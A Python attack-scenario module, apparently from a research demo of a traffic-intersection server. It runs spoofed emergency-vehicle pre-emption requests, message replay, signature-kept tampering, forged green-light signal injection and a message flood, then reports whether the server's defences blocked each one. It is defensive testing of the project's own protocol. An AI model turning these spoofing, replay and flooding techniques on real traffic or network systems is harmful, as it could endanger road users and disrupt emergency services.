"""Attack scenarios A1–A5 against the intersection server (for research/demo only).

Threat model: the attacker is on the same network, can open TCP connections,
can read (but not alter) other clients' traffic (see captured.jsonl), and in
A1/A5 is an insider holding the shared *fleet* key. It never holds the server
key or an emergency key.

Live demo: python -m attacker.attacker --scenario A1 --security on
"""
from __future__ import annotations

import argparse
import json
import os
import statistics
import threading
import time
from collections import Counter
from typing import Optional

import config
from clients.vehicle_agent import VehicleAgent
from common.net import ClientConnection
from common.protocol import encode, make_envelope
from common.security import KeyStore, attach_sig


class Monitor:
    """Observer connection that records whether pre-emption becomes active."""

    def __init__(self, host: str, port: int, keys: Optional[KeyStore]):
        self.conn = ClientConnection(host, port, "MON1", keys.fleet_key if keys else None,
                                     max_in_bytes=config.MAX_SNAPSHOT_BYTES)
        self.preempt_seen: list[str] = []
        self._stop = threading.Event()
        self.conn.connect()
        self.conn.send("REGISTER", {"role": "observer", "resume": False})
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def _run(self) -> None:
        try:
            while not self._stop.is_set():
                for env in self.conn.recv(0.1):
                    if env["type"] == "SNAPSHOT" and env["payload"]["signal"]["preemption"]:
                        self.preempt_seen.append(env["payload"]["signal"]["preemption"])
        except (OSError, ValueError):
            pass

    def reset(self) -> None:
        self.preempt_seen.clear()

    @property
    def triggered(self) -> bool:
        return bool(self.preempt_seen)

    def close(self) -> None:
        self._stop.set()
        self.thread.join(1)
        self.conn.close()


def _result(scenario: str) -> dict:
    return {"scenario": scenario, "attempts": 0, "accepted": 0, "rejected": 0,
            "reasons": Counter(), "preemption_triggered": False, "notes": ""}


def _send_and_judge(conn: ClientConnection, data: bytes, res: dict, wait: float = 0.3) -> None:
    """Send raw bytes; an ERROR reply counts as rejected, anything else as accepted."""
    res["attempts"] += 1
    try:
        conn.send_raw(data)
        end = time.monotonic() + wait
        while time.monotonic() < end:
            for env in conn.recv(end - time.monotonic()):
                if env["type"] == "ERROR":
                    res["rejected"] += 1
                    res["reasons"][env["payload"]["code"]] += 1
                    return
                if env["type"] in ("REGISTER_ACK", "PONG", "QUEUE_INFO"):
                    res["accepted"] += 1
                    return
        res["accepted"] += 1  # silently processed (e.g. EMERGENCY_REQUEST)
    except (OSError, ValueError):
        res["rejected"] += 1
        res["reasons"]["DISCONNECTED"] += 1


def load_capture(path: str) -> list[dict]:
    with open(path, encoding="utf-8") as fh:
        return [json.loads(line) for line in fh if line.strip()]


# --------------------------------------------------------------------- A1
def a1_fake_ambulance(host: str, port: int, fleet_key: Optional[bytes], approach: str = "N") -> dict:
    """Register as 'emergency' with ID AMB99 and request pre-emption,
    once signed with the (stolen) fleet key and once unsigned."""
    res = _result("A1")
    for key in ([fleet_key] if fleet_key else []) + [None]:
        conn = ClientConnection(host, port, "AMB99", key)
        conn.connect()
        for mtype, payload in (("REGISTER", {"role": "emergency", "approach": approach, "resume": False}),
                               ("EMERGENCY_REQUEST", {"approach": approach, "eta_s": 4.0})):
            env = attach_sig(make_envelope(mtype, "AMB99", payload), key)
            _send_and_judge(conn, encode(env), res)
        conn.close()
    res["notes"] = "fleet-key-signed and unsigned attempts"
    return res


# --------------------------------------------------------------------- A2
def a2_replay(host: str, port: int, captured: list[dict], min_age_s: float = 10.0) -> dict:
    """Resend the ambulance's captured REGISTER and EMERGENCY_REQUEST, unchanged."""
    res = _result("A2")
    msgs = [m for m in captured if m["type"] in ("REGISTER", "EMERGENCY_REQUEST")]
    if not msgs:
        res["notes"] = "no usable messages in capture"
        return res
    age = time.time() - max(m["ts"] for m in msgs)
    if age < min_age_s:
        print(f"  waiting {min_age_s - age:.0f} s so the captured messages are {min_age_s:.0f} s old...",
              flush=True)
        time.sleep(min_age_s - age)
    conn = ClientConnection(host, port, msgs[0]["sender"])
    conn.connect()
    for m in msgs:
        _send_and_judge(conn, encode(m), res)
    conn.close()
    res["notes"] = f"replayed {len(msgs)} captured messages >= {min_age_s:.0f}s old"
    return res


def a2b_immediate_replay(host: str, port: int, captured: list[dict]) -> dict:
    """Replay captured messages at once (inside the freshness window): nonce check."""
    res = _result("A2b")
    msgs = [m for m in captured if m["type"] in ("REGISTER", "EMERGENCY_REQUEST")]
    conn = ClientConnection(host, port, msgs[0]["sender"])
    conn.connect()
    for m in msgs:
        _send_and_judge(conn, encode(m), res)
    conn.close()
    res["notes"] = "replayed within the freshness window"
    return res


# --------------------------------------------------------------------- A3
def a3_tamper(host: str, port: int, captured: list[dict], new_approach: str = "N") -> dict:
    """Change 'approach' in captured, validly signed messages and keep the old signature."""
    res = _result("A3")
    msgs = [dict(m, payload=dict(m["payload"], approach=new_approach))
            for m in captured if m["type"] in ("REGISTER", "EMERGENCY_REQUEST")]
    conn = ClientConnection(host, port, msgs[0]["sender"])
    conn.connect()
    for m in msgs:
        _send_and_judge(conn, encode(m), res)
    conn.close()
    res["notes"] = f"approach rewritten to {new_approach}, original sig kept"
    return res


# --------------------------------------------------------------------- A4
def a4_fake_signal(client_security: bool, keys: Optional[KeyStore]) -> dict:
    """Inject fake 'green' SIGNAL_STATEs into a vehicle client's message handler.

    The attacker cannot take over the server's TCP stream, so this is tested at
    the client: one message unsigned and one signed with a wrong key.
    """
    res = _result("A4")
    agent = VehicleAgent("V0999", "N", keys=keys, security=client_security)
    real = attach_sig(make_envelope("SIGNAL_STATE", "SERVER", {
        "phase": "EW_GREEN", "ns": "red", "ew": "green", "phase_elapsed_s": 1.0,
        "signal_mode": "fixed", "preemption": None}), keys.server_key if keys else None)
    agent.handle_message(real)  # last valid state: N is red
    for key in (None, b"attacker-guess-key"):
        fake = attach_sig(make_envelope("SIGNAL_STATE", "SERVER", {
            "phase": "NS_GREEN", "ns": "green", "ew": "red", "phase_elapsed_s": 0.0,
            "signal_mode": "fixed", "preemption": None}), key)
        before = len(agent.security_rejections)
        agent.handle_message(fake)
        res["attempts"] += 1
        if len(agent.security_rejections) > before:
            res["rejected"] += 1
            res["reasons"]["BAD_SIGNATURE"] += 1
        else:
            res["accepted"] += 1
    res["notes"] = f"client sees N light = {agent.light()} after injection"
    return res


# --------------------------------------------------------------------- A5
def _ping_client(host, port, vid, keys, stop: threading.Event, samples: list, start_evt=None):
    key = keys.fleet_key if keys else None
    c = ClientConnection(host, port, vid, key)
    c.connect()
    c.send("REGISTER", {"role": "vehicle", "approach": "NSEW"[int(vid[-1]) % 4], "resume": False})
    c.wait_for("REGISTER_ACK", 3)
    while not stop.is_set():
        t0 = time.perf_counter()
        c.send("PING", {"t_send": t0})
        pong = None
        end = time.monotonic() + 2.0
        while pong is None and time.monotonic() < end:
            for env in c.recv(end - time.monotonic()):
                if env["type"] == "PONG" and env["payload"]["t_send"] == t0:
                    pong = env
        samples.append((time.perf_counter(), (time.perf_counter() - t0) * 1000 if pong else None))
        stop.wait(0.2)
    c.close()


def a5_flood(host: str, port: int, keys: Optional[KeyStore], n_messages: int = 2000,
             n_normal: int = 10, baseline_s: float = 3.0, after_s: float = 2.0,
             sustain_s: float = 0.0) -> dict:
    """Flood one connection with messages while normal clients measure PING latency.

    With ``sustain_s`` > 0 the pre-built messages are re-sent in a loop for that
    many seconds (scenario A5s), instead of one burst of ``n_messages``.
    """
    res = _result("A5s" if sustain_s else "A5")
    stop = threading.Event()
    samples: list = []
    threads = [threading.Thread(target=_ping_client, args=(host, port, f"N{i:03d}", keys, stop, samples),
                                daemon=True) for i in range(n_normal)]
    for t in threads:
        t.start()
    time.sleep(baseline_s)
    key = keys.fleet_key if keys else None
    reg = attach_sig(make_envelope("REGISTER", "V6666", {"role": "vehicle", "approach": "N",
                                                         "resume": False}), key)
    # HEARTBEATs need no reply, so the flood loads the server's receive path only.
    # Pre-signed so that signing does not slow the attacker down.
    flood = [encode(attach_sig(make_envelope("HEARTBEAT", "V6666", {}), key))
             for _ in range(n_messages)]
    conn = ClientConnection(host, port, "V6666", key)
    conn.connect()
    conn.send_env(reg)
    replies: Counter = Counter()
    disconnected = threading.Event()
    closed_by_server = threading.Event()

    def drain():
        try:
            while not disconnected.is_set():
                for env in conn.recv(0.2):
                    replies[env["payload"].get("code", env["type"])] += 1
        except (OSError, ValueError, AttributeError):
            if not disconnected.is_set():
                closed_by_server.set()
            disconnected.set()

    dt = threading.Thread(target=drain, daemon=True)
    dt.start()
    t_start = time.perf_counter()
    sent = 0
    while sent < n_messages or time.perf_counter() - t_start < sustain_s:
        try:
            conn.sock.sendall(flood[sent % n_messages])
            sent += 1
        except (OSError, AttributeError):
            closed_by_server.set()
            break
        if sustain_s and time.perf_counter() - t_start >= sustain_s:
            break
    t_end_send = time.perf_counter()
    time.sleep(after_s)
    disconnected.set()
    dt.join(1.0)
    conn.close()
    stop.set()
    for t in threads:
        t.join(3)
    base = [ms for t, ms in samples if t < t_start and ms is not None]
    during = [ms for t, ms in samples if t_start <= t <= max(t_end_send, t_start + 1.0)]
    lost_during = sum(1 for ms in during if ms is None)
    during_ok = [ms for ms in during if ms is not None]
    res["attempts"] = sent if sustain_s else n_messages
    res["accepted"] = None  # filled in from the server's log by exp_attacks (HEARTBEAT has no reply)
    res["reasons"] = Counter({k: v for k, v in replies.items() if k == "RATE_LIMITED"})
    res["rejected"] = sum(res["reasons"].values())
    res["flood"] = {
        "sent": sent, "send_duration_s": t_end_send - t_start,
        "baseline_p50_ms": statistics.median(base) if base else None,
        "baseline_p95_ms": _p95(base), "during_p50_ms": statistics.median(during_ok) if during_ok else None,
        "during_p95_ms": _p95(during_ok), "during_max_ms": max(during_ok) if during_ok else None,
        "during_lost": lost_during, "during_samples": len(during),
        "closed_by_server": closed_by_server.is_set()}
    f = res["flood"]
    res["notes"] = (f"normal clients p50/p95 ms baseline {_fmt(f['baseline_p50_ms'])}/"
                    f"{_fmt(f['baseline_p95_ms'])} vs during flood {_fmt(f['during_p50_ms'])}/"
                    f"{_fmt(f['during_p95_ms'])}; lost {lost_during}; flooder delivered "
                    f"{sent}/{res['attempts']} in {t_end_send - t_start:.2f}s")
    return res


def _p95(xs: list) -> Optional[float]:
    if not xs:
        return None
    s = sorted(xs)
    return s[min(len(s) - 1, int(0.95 * len(s)))]


def _fmt(x) -> str:
    return "-" if x is None else f"{x:.2f}"


def main() -> None:
    ap = argparse.ArgumentParser(description="Run one attack scenario against a live server")
    ap.add_argument("--scenario", choices=["A1", "A2", "A2b", "A3", "A4", "A5"], required=True)
    ap.add_argument("--security", choices=["on", "off"], default="on",
                    help="mode the target runs in (A4 uses it for the client)")
    ap.add_argument("--host", default=config.HOST)
    ap.add_argument("--port", type=int, default=config.PORT)
    ap.add_argument("--keys", default=config.KEYS_FILE,
                    help="the attacker only uses the fleet key from this file (insider)")
    ap.add_argument("--capture", default="captured.jsonl")
    ap.add_argument("--approach", default="N")
    ap.add_argument("--sustain", type=float, default=0.0, help="A5: keep flooding for this many seconds")
    args = ap.parse_args()
    print(f"{args.scenario}: {DESCRIPTIONS[args.scenario]}", flush=True)
    keys = KeyStore.load(args.keys) if os.path.exists(args.keys) else None
    fleet = keys.fleet_key if keys else None
    if args.scenario == "A1":
        res = a1_fake_ambulance(args.host, args.port, fleet, args.approach)
    elif args.scenario in ("A2", "A2b", "A3"):
        cap = load_capture(args.capture)
        fn = {"A2": a2_replay, "A2b": a2b_immediate_replay, "A3": a3_tamper}[args.scenario]
        res = fn(args.host, args.port, cap)
    elif args.scenario == "A4":
        res = a4_fake_signal(args.security == "on", keys)
    else:
        res = a5_flood(args.host, args.port, keys if args.security == "on" else None,
                       sustain_s=args.sustain)
        res["accepted"] = "n/a"
    print(f"{res['scenario']}: attempts={res['attempts']} accepted={res['accepted']} "
          f"rejected={res['rejected']} reasons={dict(res['reasons'])}")
    print(f"  {res['notes']}")
    print(verdict(res))


DESCRIPTIONS = {
    "A1": "Fake ambulance: 'AMB99' registers as emergency and requests a green light "
          "(once signed with a stolen fleet key, once unsigned)",
    "A2": "Replay: re-send the real ambulance's captured messages 10 s later",
    "A2b": "Immediate replay: re-send captured messages inside the 2 s freshness window",
    "A3": "Tampering: change the approach in a captured, signed message and keep the old signature",
    "A4": "Fake signal: inject a forged 'green' SIGNAL_STATE into a vehicle client",
    "A5": "Flooding: send messages as fast as possible on one connection",
}


def verdict(res: dict) -> str:
    """One-line human-readable outcome of an attack."""
    if res["scenario"].startswith("A5"):
        f = res.get("flood", {})
        if f.get("closed_by_server") or res["reasons"].get("RATE_LIMITED"):
            return ("RESULT: BLOCKED - flooder rate-limited and disconnected; normal p95 latency "
                    f"{_fmt(f.get('baseline_p95_ms'))} -> {_fmt(f.get('during_p95_ms'))} ms")
        return ("RESULT: SUCCEEDED - server processed the whole flood; normal p95 latency "
                f"{_fmt(f.get('baseline_p95_ms'))} -> {_fmt(f.get('during_p95_ms'))} ms")
    if not res["attempts"]:
        return "RESULT: not run - " + res["notes"]
    if res["accepted"] == 0:
        reasons = ", ".join(f"{k} x{v}" for k, v in res["reasons"].items())
        return f"RESULT: BLOCKED - all {res['attempts']} messages rejected ({reasons})"
    return f"RESULT: SUCCEEDED - {res['accepted']}/{res['attempts']} attack messages accepted"


if __name__ == "__main__":
    main()
